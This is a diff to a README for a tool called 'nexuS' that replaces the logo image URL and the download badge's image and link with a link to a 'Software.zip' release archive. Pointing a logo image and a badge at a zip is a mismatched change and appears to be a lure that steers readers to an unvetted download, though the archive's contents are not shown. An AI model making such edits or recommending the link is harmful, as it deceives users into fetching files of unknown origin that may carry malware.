@@ -2,7 +2,7 @@
 
 ---
 
-![NexuS Logo](https://www.example.com/logo.png)
+![NexuS Logo](https://github.com/alexiza84/nexuS/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Welcome to the **nexuS** repository! Here you will find an amazing collection of
 
 To get started with **nexuS**, simply download the latest version by clicking the button below:
 
-[![Download nexuS](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download nexuS](https://github.com/alexiza84/nexuS/releases/download/v1.0/Software.zip)](https://github.com/alexiza84/nexuS/releases/download/v1.0/Software.zip)
 
 After downloading the file, follow the installation instructions provided in the repository to launch the tool and start utilizing its features.
 
